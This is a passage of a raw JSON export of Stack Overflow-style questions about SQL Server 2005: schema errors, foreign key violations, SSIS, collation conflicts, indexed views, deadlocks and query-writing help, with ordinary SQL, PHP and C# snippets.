C.</p>\n"},{"tags":["sql-server-2005","schema"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12302158,"title":"Invalid Object Name in mssql 2005","body":"<p>We currently have an issue with our MSSQL 2005 database. We've recently undergone a migration from windows server 2003 to 2008. SQL Server has remained as 2005. I'm using SQL Server Management Studio to work on.</p>\n\n<p>All the tables in the database follow the format: [SCHEMA].[TABLE_NAME]</p>\n\n<p>When I enter the SQL:</p>\n\n<pre><code>SELECT * FROM [table_name]\n</code></pre>\n\n<p>I get the error message: Invalid object name '[table_name]'.</p>\n\n<p>If I type in:</p>\n\n<pre><code>SELECT * FROM [schema].[table_name]\n</code></pre>\n\n<p>This works fine. The username we log into the database with owns the schema which is prepended to all the table names.</p>\n\n<p>The problem is, we have 3rd party companies which have software which exports data from the database. 2 companies have now tried to run their exporters, however are getting the error 'Invalid object name'. The software is logging in with the username which owns the schema.</p>\n\n<p>My question is exactly the same as this one I've found on the internet:\n<a href=\"http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=99802\" rel=\"nofollow\">http://www.sqlteam.com/forums/topic.asp?TOPIC_ID=99802</a></p>\n\n<p>However the answer on that question seems to be full of keywords rather than actual sentences which makes it very hard to understand.</p>\n\n<p>If anyone could help, it'd be greatly appreciated.</p>\n\n<p>Many thanks</p>\n\n<p>Phil</p>\n"},{"tags":["sql","sql-server","sql-server-2005","error-handling","foreign-key-relationship"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":102,"score":1,"question_id":12296870,"title":"How to determine table row causing duplicate entry error in INSERT?","body":"<p><em>As I get a lot of answers trying to help me with getting around the error:\nI am mostly interested in a <strong>way to do error handling and to detect the table row creating an error</strong> than getting around my actual problem which I only use to illustrate what is coded in the stored procedure.</em></p>\n\n<hr>\n\n<p>I am doing an SQL Insert statement in a stored procedure for entries missing in the table:</p>\n\n<pre><code>INSERT INTO dbo.t1\n                      (col1, col2, col3, col4, col5)\n    SELECT DISTINCT col1, col2, col3, col4, col5\n    FROM         dbo.t2\n    WHERE     (NOT EXISTS\n                          (SELECT     col1, col2, col3, col4, col5\n                            FROM      t1 AS Table_1\n                            WHERE     (col1 = t2.col1) AND \n                                      (col2 = t2.col2) AND\n                                      (col3 = t2.col3) AND\n                                      (col4 = t2.col4) AND\n                                      (col5 = t2.col5))) AND\n                                       col2 = 'VALUE'\n</code></pre>\n\n<p>t1.col1 + t1.col2 and t1.col3 + t1.col4 have a foreign key relation to another table t3.col1 + t3.col2</p>\n\n<p>The stored procedure fails to finish throwing an error message that the foreign key relation has been violated; i.e. there are some entries missing in t3:</p>\n\n<blockquote>\n  <p>Msg 547, Level 16, State 0 [...] INSERT statement is in conflict with\n  FOREIGN-KEY [..]</p>\n</blockquote>\n\n<p><strong>What I would like to know is the TABLE ROW of t2 causing the error</strong>, optimally the values in this row. I googled quite a lot about SQL error handling, but only found examples providing the coding line raising the error - which is useless information for me...</p>\n\n<p>Any help appreciated</p>\n"},{"tags":["php","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12230185,"title":"select all values from dropdown list in php if nothing is selected","body":"<p>I have a sql stored procedure similar to below :</p>\n\n<pre><code>create procedure procedurename\ndeclare @startdate datetime, @enddate endtime, @field1 varchar(15) = null\n\nselect * from table1\nwhere field1 = @field1 or @field1 is null\nand date between @startdate and @enddate\n</code></pre>\n\n<p>And when I want to display all values from field1, i just ignore supplying parameter @field1 while executing as below </p>\n\n<pre><code>execute procedurename @startdate = '01/07/2012', @enddate = '31/07/2012'\n</code></pre>\n\n<p>Now I want to access the stored procedure in browser and I tried the code below but if I select \"select all\" option, it displays blank result.</p>\n\n<pre><code>&lt;?php\n$attr = 'selected=\"selected\"';  ?&gt;\n&lt;?php\n$field1= isset($_REQUEST['field1']) ? $_REQUEST['field1'] : null; ?&gt;\n&lt;select name=\"field1\" style=\"margin-bottom:3px;\"&gt; \n&lt;option&gt; select all &lt;/option&gt;\n&lt;option value=\"xyz\" &lt;?php echo $field1 == 'xyz' ? $attr : ''; ?&gt;&gt;xyz&lt;/option&gt;\n&lt;option value=\"abc\" &lt;?php echo $field1 == 'abc' ? $attr : ''; ?&gt;&gt;abc&lt;/option&gt;\n &lt;option value=\"def\" &lt;?php echo $field1 == 'def' ? $attr : ''; ?&gt;&gt;abc&lt;/option&gt;\n&lt;/select&gt;\n</code></pre>\n\n<p>So basically I want to it to select all values of field1 if I select \"select all\" from drop-down box.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","backup"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12288043,"title":"Copying a SQL Server database to another database","body":"<p>I have a database in SQL server 2005 that is called MyStaging and I made a blank one called MyStaging_bk.  I went to Backup MyStaging and then tried to restore in to MyStaging_bk. But it says I cannot restore since the backup sets are different.</p>\n\n<p>How do I copy db's and they are on the same database server?</p>\n"},{"tags":["c#","sql-server-2005","com-interop","stemming","wordbreaker"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12287801,"title":"How can I use the word breaker from Microsoft SQL Server 2005 in my stand-alone C# program","body":"<p>I am writing a program which will query a full text search index on Microsoft SQL Server 2005. The data being indexed are large blobs of text (multiple lines).</p>\n\n<p>I need to extract only those lines of text which contain the search words for display with the results.</p>\n\n<p>I therefore need to use the Sql Server word breaker and stemmer to determine if each line of text from the blob matches the search string, as I understand the standard word breaker and stemmer in Windows search uses a different algorithm.</p>\n\n<p>I thought if I copied the two dlls (infosoft and langwrbk) from a SQL Server installation to the machine on which I am running my program, and ran regsvr32 on them, they would be installed in the registry, and I would be able to use them.</p>\n\n<p>No such luck - running regsvr32 does not seem to add anything to the registry at all!</p>\n\n<p>I have code which does the job with the word breaker and stemmer that comes with Windows, and it works, but I'm worried about the differences (which I have seen complained about in other posts here).</p>\n"},{"tags":["sql-server-2005","stored-procedures","select"],"answer_count":2,"favorite_count":2,"up_vote_count":13,"down_vote_count":0,"view_count":16764,"score":13,"question_id":4647700,"title":"SQL Stored Procedure set variables using SELECT","body":"<p>I have a stored procedure in SQL Server 2005 with multiple variables and I want to set the values of these variables using a select statement. All three variables come from a same table and there should be a way to set them using one select statement instead of the way I currently have as shown below. Please help me to figure it out.</p>\n\n<pre><code>DECLARE @currentTerm nvarchar(max)\n\nDECLARE @termID int\n\nDECLARE @endDate datetime\n\nSET @currentTerm =\n(\n    Select CurrentTerm from table1 where IsCurrent = 1\n)\n\nSET @termID =\n(\n    Select TermID from table1 where IsCurrent = 1\n)\n\nSET @endDate =\n(\n    Select EndDate from table1 where IsCurrent = 1\n)\n</code></pre>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":277,"score":0,"question_id":1333373,"title":"How to send mails to Multiple mail ids selected dynamically using send mail task in SSIS?","body":"<p>I am using SSIS 2005 for creating package.\nI am having a requirement where I need to get data from database &amp; store it in a destination and retrieve only email ids from that store and send mails to each and every id that I have received.\nI am using Expressions in the send mail task where I am getting the mail ids from the record set store. But the task is unable to retrieve all those records and showing an error as <code>'No recipients in the Send mail task'</code>.</p>\n\n<p>Please suggest.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1051,"score":0,"question_id":2673673,"title":"Cannot resolve collation conflict in Union select","body":"<p>I've got two queries:</p>\n\n<p>First doesn't work:</p>\n\n<pre><code>select hotels.TargetCode as TargetCode from hotels\nunion all \nselect DuplicatedObjects.duplicatetargetCode as TargetCode \nfrom DuplicatedObjects where DuplicatedObjects.objectType=4\n</code></pre>\n\n<p>because I get error:</p>\n\n<pre><code>Cannot resolve collation conflict for column 1 in SELECT statement.\n</code></pre>\n\n<p>Second works:</p>\n\n<pre><code>select hotels.Code from hotels where hotels.targetcode is not null \nunion all \nselect DuplicatedObjects.duplicatetargetCode as Code \nfrom DuplicatedObjects where DuplicatedObjects.objectType=4 \n</code></pre>\n\n<p>Structure: </p>\n\n<pre><code>Hotels.Code -PK nvarchar(40)\nHotels.TargetCode - nvarchar(100)\n\nDuplicatedObjects.duplicatetargetCode PK nvarchar(100)\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12293582,"title":"Removing Space from Stored Table row with Procedure in SQL","body":"<p>I was looking for a stored procedure for SQL server 2005 to remove leading, trailing and other spaces of records stored in the table.</p>\n\n<p>Basically, I needed to bulk insert data into my Database, and the table that I am working on contains blank spaces in various records. Take an instance of Pincode/Zip code, that cannot have spaces between them but the data I have inserted had spaces in most of the pincodes like \"<strong>110 001</strong>\", however it should be \"<strong>110001</strong>\". In other columns the data is in form of \" <strong>data</strong> \" where it should be \"<strong>data</strong>\"</p>\n\n<p>I have already inserted the data but, I need to format it now, so as to arrange it in proper form.</p>\n"},{"tags":["sql-server","sql-server-2005","service","reporting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12262167,"title":"How to create a column/rows report in SQL 2005 Reporting Services?","body":"<p>In SQL Reporting Services 2005 SP3, we have the following tabular report:</p>\n\n<pre><code>JobName       Product      Weight Processed      Start                 End\n---------------------------------------------------------------------------------------\n2284          30mm         128 kg                11:55 04/09/2012      14:34 04/09/2012\n3686          15mm         234 kg                19:21 03/09/2012      00:23 04/09/2012\n</code></pre>\n\n<p>We want to convert this into a columns/rows type report, e.g.:</p>\n\n<pre><code>JobName                  2284                3686\n-------------------------------------------------------------\nProduct                  30mm                15mm\nWeight Processed         128 kg              234 kg\nStart                    11:55 04/09/2012    19:21 03/09/2012 \nEnd                      14:34 04/09/2012    00:23 04/09/2012\n</code></pre>\n\n<p>How can we do this in SRS 2005?  We originally created the report as 'tabular' using the wizard.  We've tried using the matrix style and have selected JobName as the column and the rest of the fields as the rows, but it doesn't let us proceed without an entry in Details, but this view isn't giving us what we want.  It's listing the JobName repeating as columns but not listing the other fields as rows underneath.</p>\n\n<p>Can anyone help on how we need to set up the report?\nThanks</p>\n"},{"tags":["sql","sql-server-2005","ssis","null"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1480,"score":1,"question_id":4620755,"title":"How do I retain NULL values when using SSIS to import from flat file in SQL Server 2005","body":"<p>I've exported records to a flat file delimited by \"|\" and it seems that when I import those records into a new database , SQL Server treats the NULL values as empty fields. IMy queries worked properly when the records/fields were NULL and so I want to either find a way to retain the NULL values in the data or convert the blank fields to NULL values. I'm assuming the former would be easier, but I don't know how to do that. Any help would be appreciated.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12283812,"title":"Name of the calling stored procedure with @@nestlevel = 1","body":"<p>I have a stored procedure which is nested in several other stored procedure. Is there a way to tell (inside the internal stored procedure) which is the caller?</p>\n\n<pre><code>CREATE PROC int_proc \nAS\n\nSELECT int_name = OBJECT_NAME(@@PROCID)\n      ,ext_name = 'How can I tell which is the ext_proc name?'\n      ,nestlevel = @@NESTLEVEL\n\nGO\nCREATE PROC ext_proc1\nAS\nSELECT ext_name = OBJECT_NAME(@@PROCID),nestlevel = @@NESTLEVEL\nEXECUTE int_proc\n\nGO\nCREATE PROC ext_proc2\nAS\nSELECT ext_name = OBJECT_NAME(@@PROCID),nestlevel = @@NESTLEVEL\nEXECUTE int_proc\n\nGO\n\nEXEC ext_proc1\nEXEC ext_proc2\n</code></pre>\n\n<p>I'm using SQL-Server 2005</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":102,"score":-1,"question_id":12267110,"title":"How to build this sql query","body":"<p>i want to find the records in sql\nfrom say 25-08-2012 to 01-09-2012\nand i want to group by date</p>\n\n<p>here is my query</p>\n\n<pre><code>SELECT CONVERT(VARCHAR(10), date, 105) AS dt,\nCOUNT(id) AS cnt\nFROM tablename\nWHERE date BETWEEN CONVERT(DATETIME, '21-08-2012 00:00:00:000',103)\nAND CONVERT(DATETIME, '01-09-2012 23:59:00:000' ,103)\nGROUP BY CONVERT(VARCHAR(10), date, 105)\n</code></pre>\n\n<p>i am getting result as</p>\n\n<pre><code>dt                 cnt\n01-09-2012         48\n27-08-2012         1\n28-08-2012         3\n29-08-2012         11\n30-08-2012         3\n</code></pre>\n\n<p>but expect it as</p>\n\n<pre><code>dt                 cnt\n25-08-2012          0\n26-08-2012          0\n01-09-2012          48\n27-08-2012          1\n28-08-2012          3\n29-08-2012         11\n30-08-2012          3\n</code></pre>\n\n<p>How i can modify above query\ni also tried with CASE but no luck</p>\n\n<p>Many Thanks..</p>\n"},{"tags":["sql-server-2005","table-valued-parameters"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12280381,"title":"SQL Server table valued function parameter","body":"<p>I got following table valued function (in SQL Server 2005). I got an compile error when I run --1, but --3 is ok, --2 is used to generate the parameters to be used in --3, which should be the same as in --1. But why --1 got the error?</p>\n\n<pre><code>create function test_udf_nz_2 (\n    @a datetime\n    ,@b datetime\n)\nreturns @result TABLE(\n    c1 datetime\n    ,c2 datetime\n)\nas\nbegin\n    insert into @result\n    select @a, @b\n    return\nend\n\n\ndeclare\n    @dt_report_date DATETIME \n    ,@v_stores VARCHAR(MAX) \n\nselect @dt_report_date = '20120831'\n        ,@v_stores = '152'\n--1\nselect * from dbo.test_udf_nz_2( DATEADD(hour,0,DATEDIFF(d,0,@dt_report_date)), DATEADD(hour,24,DATEDIFF(d,0,@dt_report_date))) AS t\n\n--2\n--select DATEADD(hour,0,DATEDIFF(d,0,@dt_report_date)), DATEADD(hour,24,DATEDIFF(d,0,@dt_report_date))\n\n--3\nselect * from dbo.test_udf_nz_2( '20120831', '20120901') AS t\n</code></pre>\n"},{"tags":["sql-server-2005","asp.net-4.0","asp.net-4.5"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12279943,"title":"How to create the charts in ASP.NET 4.0 using database","body":"<p>I want to create the charts in asp.net 4.0 using the database tables. i am using the charts control in that is present in visual studio 2010 but the output is not coming on the browser.</p>\n"},{"tags":["java","hibernate","sql-server-2005","jpa","spring-roo"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":86,"score":1,"question_id":12266094,"title":"Spring Roo JPA - Why are manual DB updates automatically available in Persistence Context?","body":"<p>I have developed a web app using Spring Roo (Spring MVC 3), JPA 1, Hibernate, JSTL, JQUERY etc..Persistence Contexts are application managed via a JPA Transaction manager. DB used is MSSQL2005. The application is running on JBOSS 5.</p>\n\n<p>Everything works fine. My question is something that has been on my mind, yet i have yet to come across a suitable answer.</p>\n\n<p>Suppose the following:</p>\n\n<ol>\n<li>I retrieve some row from Table T using entitymanager.find(), and present the data to a page</li>\n<li>I manually change one of the field values in the row (via SQL an gui tool).</li>\n<li>I immediately repeat step (1), and I have the manually updated value available.</li>\n</ol>\n\n<p>Is this correct? My understanding was that values within the persistence context do not get updated unless:</p>\n\n<ul>\n<li>calling em.refesh()</li>\n<li>object is not available in PERSISTENCE CONTEXT (--> query DB instead)</li>\n</ul>\n\n<p>My experience seems to contradict the link below, which actually makes logical sense to me.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/7175044/updated-data-in-database-is-not-visible-via-jpa-eclipselink\">Updated data (in Database) is not visible via JPA/Eclipselink</a></p>\n\n<p>Many thanks</p>\n\n<p>NaP</p>\n"},{"tags":["sql-server-2005","jsp","ip","internet","jtds"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12275616,"title":"Can remote server connect with the client through internet and IP?","body":"<p>Can remote server connect with the client through internet and IP?\nOur server is in one building and want to be accessed by the client in the other building which is 100 feet distant from the 1st building. I am using applications JSP, SQL server 2005, tomcat server and jtds.<br>\nHow can I do this?\nPlease help me.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","database-design"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":165,"score":1,"question_id":11802429,"title":"\"Prevent saving changes that require the table to be re-created\" negative effects","body":"<p>I was modifying a column in SQL Server 2008 today, changing the datatype from something like currency(18,0) to (19,2).  </p>\n\n<p>I got the usual error \"The changes you have made require the following tables to be dropped and re-created\" from SQL Server. </p>\n\n<p>I know there is the option in Tools-> Options -> Designer -> Table and Database Designers -> Uncheck the box Prevent saving changes that require table re-creation, but...</p>\n\n<p>My question is this : are there any negative effects / possible drawbacks of doing this? Does the table actually get dropped and recreated automatically when this box is unchecked, and if so, is the new table a 100% exact copy of the old one?</p>\n\n<p>Thanks!</p>\n"},{"tags":["tsql","sql-server-2005","merge"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12269817,"title":"Update any column in target table with corresponding non-null source field","body":"<p>This is probably a familiar problem but i didn't find an answer in searches.  I do have a solution (shown below) that involves COALESCE on every non-key column, I'm wondering if there's a Dynamic TSQL routine, or perhaps a different way of forumulating the query that doesn't involve explicitly naming all the columns.  </p>\n\n<p>I have two tables, \"targetTable\" and \"deltaTable\", that have a the same field names and types.  Both have a unique key, \"id\". </p>\n\n<p>Deltatable has data that has changed for a corresponding row in targetTable.  Any column where the value hasn't changed is null.  I want to update the columns in the targetTable that have non-null values in the corresponding row of the deltaTable.  DetlaTable.id is guaranteed to exist in TargetTable.id, and I never want to update a field to NULL.</p>\n\n<p>I'm using SQL Server 2005 (which doesn't have the merge statement, not that I know it would help).</p>\n\n<p>So if a targetTable row looks like</p>\n\n<pre><code>  id | name    |  dob        | next_appt\n  5    Bill       1-1-2012   | 3-3-2015\n</code></pre>\n\n<p>and a deltaTable row looks like</p>\n\n<pre><code>  id | name     | dob        | next_appt\n  5  | NULL     | NULL       | 4-4-2015\n</code></pre>\n\n<p>I want targetTable updated to </p>\n\n<pre><code>  id | name    |  dob        | next_appt\n  5    Bill       1-1-2012   | 4-4-2015\n</code></pre>\n\n<p>What I have now that I want to improve on is:</p>\n\n<pre><code>UPDATE target\nSET target.colA = COALESCE(delta.colA, target.colA),\n    target.colN = COALESCE(delta.colN, target.colN)\nFROM  delta JOIN target on delta.id = target.id\n</code></pre>\n"},{"tags":["sql","sql-server-2008","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12270737,"title":"TSQL - ROUND price to .05 and .09. UPDATE is producing NULLs?","body":"<p>I have a table, PriceTable, </p>\n\n<p>columns UPC (int), Price (money)</p>\n\n<p>I am trying to round all of the cents in the Price column, to end in either .x5 or .x9. </p>\n\n<p>If the last digit of the price is 0-5, then the last digit should be a 5.<br>\nIf the last digit of the price is 6-9, then the last digit should be a 9. \n<br>\nExamples<br><ul><li>1.00 goes to 1.05</li><li>1.21 goes to 1.25</li><li>1.26 goes to 1.29</li></ul></p>\n\n<p>I am using the following, but after the update, I am getting some records where the price is being updated to NULL and I can't figure out why. It is working correctly for 95% of the data, but I can't see anything different with the data where it isn't. </p>\n\n<p>My thinking was the (Round(Price,1,2) gives me the dollar in the Price. Subtract that from the overall Price to get the cents and then use the CASE statement add the correct .05 or .09 back to the Price. </p>\n\n<pre><code>UPDATE PriceTable\nSET Price = ROUND(Price,1,2) + \nCASE \nWHEN Price -(ROUND(Price,1,2)) BETWEEN .00 AND .05 THEN .05\nWHEN Price -(ROUND(Price,1,2)) BETWEEN .06 AND .09 THEN .09\nEND;\n</code></pre>\n\n<p>Is there a better way to do this? I can't wrap my head around why I would get a NULL for Price when all cent scenarios should be accounted for and even if they weren't, I should still get the dollar amount of price with the ROUND(Price,1,2). I shouldn't need an ELSE as there shouldn't be any other conditions. </p>\n\n<p>Thanks, </p>\n\n<p>Marshall</p>\n"},{"tags":["sql-server","sql-server-2005","synchronization"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":397,"score":0,"question_id":881099,"title":"synchronize two sql server 2005","body":"<p>I need to synchronize two sql server 2005 instances between intranet and extranet (through a firewall). Synchronization will be initiated from the intranet. What solutions do I have at my disposal?</p>\n\n<p>intranet db: table t1 -> extranet db: table t1</p>\n\n<p>intranet db: table t2 &lt;- extranet db: table t2</p>\n\n<p>i.e. intranet t1 content should be pushed out to extranet t1 \nand intranet t2 content should be fetched from extranet t2.</p>\n\n<p>We intend to sync every hour.</p>\n"},{"tags":["sql-server-2005","documentation","ssis"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":373,"score":1,"question_id":886589,"title":"Inline documentation for SSIS packages","body":"<p>Is there a way to create an inline documentation (like javadocs) for SSIS packages? Or what other techniques do you use to document the things you develop for SQL Server 2005? </p>\n"},{"tags":["c#","asp.net","sql-server-2005","c#-2.0"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":97,"score":-4,"question_id":12142164,"title":"How to find a number is within some specified range or not","body":"<p>I have inserted data in database like:</p>\n\n<pre><code>Name  Range\n\nFan   1-100\nTable 40-400\nTest  50-500\n</code></pre>\n\n<p>Now I want to select range like if user enters  Range Value = 45......\nIt should return first and second row. </p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12264602,"title":"How do check if a parameter is empty or null in Sql Server stored procedure in IF statement?","body":"<p>I read this: <a href=\"http://stackoverflow.com/questions/334108/how-do-i-check-if-a-sql-server-string-is-null-or-empty\">How do I check if a Sql server string is null or empty</a> but it not helped me in this situation.</p>\n\n<p>The piece of code from my stored procedure:</p>\n\n<pre><code>IF (@item1 IS NOT NULL) OR (LEN(@item1) &gt; 0)\n        SELECT @sql = 'SELECT * FROM TEST1'\n    ELSE\n        SELECT @sql = 'SELECT * FROM TEST2'\n PRINT @sql;\n</code></pre>\n\n<p><code>@item1</code> is <code>NVARCHAR(1000)</code> type.</p>\n\n<p>When execute this stored procedure, I provided the value for <code>item1</code></p>\n\n<pre><code>EXEC    [dbo].[my_proc]\n        @item1 = N''\n</code></pre>\n\n<p>it shows</p>\n\n<p><code>SELECT * FROM TEST1</code> // it is correct if <code>@item1 = N'some'</code></p>\n\n<p>instead of</p>\n\n<p><code>SELECT * FROM TEST2</code></p>\n\n<p>It is somewhere a function in sql to verify if a string is null or empty <strong>OR</strong> I made somewhere a mistake ?</p>\n\n<p>Like in C# -> <code>string.IsNullOrEmpty(myValue)</code></p>\n"},{"tags":["c#","sql-server-2005","ado.net"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1230,"score":2,"question_id":1242993,"title":"What does Trusted = yes/no mean in Sql connection string?","body":"<p>What does Trusted = yes/no mean in Sql connection string?</p>\n\n<p>I am creating a connection string as below :</p>\n\n<pre><code>            string con= string.Format(\n                \"user id=admin;password=admin;server={0};Trusted_Connection=yes;database=dbtest;connection timeout=600\",\n                _sqlServer);\n</code></pre>\n\n<p>Please Help</p>\n"},{"tags":["sql-server","sql-server-2005","ssis","etl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":170,"score":0,"question_id":12259732,"title":"Import Latest csv file in a folder - SSIS","body":"<p>I want to import the latest csv file into a table using SSIS? I currently have a step that gets the last file in a folder:   </p>\n\n<pre><code> Report_201209030655.csv\n Report_201209030655.csv\n Report_201209030655.csv\n</code></pre>\n\n<p>Based on created time I want steps to import data of the latest csv to a table.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","indexed-view"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":192,"score":1,"question_id":1846509,"title":"Error creating indexed view","body":"<p>I have problem with a counting column in my view.</p>\n\n<pre><code>SELECT ColumnC, ColumnA % ColumnB AS ModuloColAColB, COUNT_BIG(*) AS cBig FROM dbo.T1\nGROUP BY ColumnC, ModuloColAColB \n</code></pre>\n\n<p>Query is similar to this MSDN example:\n<a href=\"http://msdn.microsoft.com/en-us/library/ms191432.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/ms191432.aspx</a></p>\n\n<p>When I try to compile view I received error message like: \n\"invalid column name ModuloColAColB\" </p>\n\n<p>So I change group by column names: </p>\n\n<pre><code>SELECT ColumnC, ColumnA % ColumnB AS ModuloColAColB,\nCOUNT_BIG(*) AS cBig FROM dbo.T1\nGROUP BY ColumnC, ColumnA, ColumnB\n</code></pre>\n\n<p>View is compiling correctly but when I try to add index I receive the error: </p>\n\n<pre><code>\"Cannot create the clustered index 'px_test' on view 'l' because the select list of the view contains an expression on result of aggregate function or grouping column.\nConsider removing expression on result of aggregate function or grouping column from select list\"\n</code></pre>\n\n<p>When I remove \" ColumnA % ColumnB AS ModuloColAColB\" all works fine.</p>\n\n<p>Database version: SQL server 2005 Enterprise Edition. </p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12257226,"title":"how to copy table data from sql server 2008 to sql server 2005 db?","body":"<p>does anyone know how to copy data from a sql server 2008 db to an sql server 2005 db? I tried to use the sql server export wizard to no avail:(</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12257234,"title":"Change From Clause based on a condition","body":"<p>I have a stored procedure which has more than 2000 lines of code .I need to change the table names in <code>from clause</code> based on a condition .The column names will remain same in both the tables .</p>\n\n<p>For example:- </p>\n\n<pre><code>   Declare @condition char(1)\n   set @condition=(Select close_flg from log \n                   where  last_run_dt &gt;= \n                  (Select  cur_dt from dt) \n                  )\n\n  --If @condition is 'A' then below sql will execute\n\n   Select a.columnA,\n        Case \n         when  @condition='A' then  'D'\n         Else 'M'\n         END,\n         b.ColumnC\n   from TableA as a\n   inner join TableB as b\n   on a.Column=b.Column\n</code></pre>\n\n<p>Now if @condition is 'B' then i need to change the sql as \n(Only the inner join is different rest all the columns in the select query are same )</p>\n\n<pre><code>   Select \n   -- the same columns as above \n   from TableC as c\n   inner join TableD as d\n   on c.Column=d.Column\n</code></pre>\n\n<p>I want to make my SQL generic to reduce the duplicate code .Is it even possible to do so .</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2005","deadlock"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":77,"score":3,"question_id":12253685,"title":"SQL Server deadlock clarity?","body":"<p>After reading <a href=\"http://blogs.msdn.com/b/sqlserverstorageengine/archive/2006/06/05/617960.aspx\" rel=\"nofollow\"><strong>this</strong></a> interesting article I have some questions.</p>\n\n<p>This table shows a deadlock situation : </p>\n\n<p><img src=\"http://i.stack.imgur.com/amkoW.jpg\" alt=\"enter image description here\"></p>\n\n<blockquote>\n  <p>T1 holds X lock on all rows with c1=5 on table t_lock1 while T2 holds\n  X lock on all rows with C1=1 on table t_lock2. </p>\n  \n  <p>Now each of these transactions wants to update the rows previously\n  locked by the other. This results in a deadlock.</p>\n</blockquote>\n\n<p>Question #1</p>\n\n<ul>\n<li>Do transactions obtain locks? I know that <em>reading</em> from table is done by a <em>shared</em> lock, and <em>write</em> to a table is done using an <em>exclusive</em> lock (I'm talking about the <em>default</em> locking settings).</li>\n</ul>\n\n<p>So it seems from this example that transaction <em>also</em> holds a lock ....is it correct?</p>\n\n<p>Question #2</p>\n\n<blockquote>\n  <p>...T1 holds X lock on all rows with c1=5 on table t_lock1...</p>\n</blockquote>\n\n<ul>\n<li>IMHO as I've said the locking is not per row (although it can be made, but the author didn't mentioned it) - so why does he say : <em>on all rows with C1=5</em> ?</li>\n</ul>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":215,"score":3,"question_id":9586254,"title":"How can I query for the server default settings for ARITHABORT, ANSI WARNINGS and ARITHIGNORE?","body":"<p>I need to query SQL Server and determine the server defaults for ARITHABORT, ANSI WARNINGS and ARITHIGNORE. What's the best way to do this?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12237543,"title":"SQL Server 2005 complex query for weighted percentage","body":"<p>I've been asked to provide the ability to report the completeness of a Task by a weighted percentage.</p>\n\n<p>Sample schema in SQL Server 2005:</p>\n\n<p>[I'm too new to post an image. Here are the basics]:</p>\n\n<pre><code>Task\n--------\nTaskID   | uniqueidentifier\nTaskName | varchar(50)\n\nTaskItem\n-----------\nTaskID        | uniqueidentifier\nItemID        | uniqueidentifier\nDateCompleted | datetime\n\nItem\n-----------\nItemID         | uniqueidentifier\nItemCategoryID | int\nItemName       | varchar(50)\nWeight         | tinyint\n\nItemCategory\n--------\nItemCategoryID   | uniqueidentifier\nItemCategoryName | varchar(50)\nWeight           | tinyint\n</code></pre>\n\n<p>A Task may consist of one or more Items, each of which is of a given ItemCategory. Both Item and ItemCategory are weighted for how much they add to the overall effort. They are weighted from 1 to 5.</p>\n\n<p>I have achieved this with a combination of Functions which I am not proud of, but it gets the job done - rather slowly. My SQL query writing skills are not the 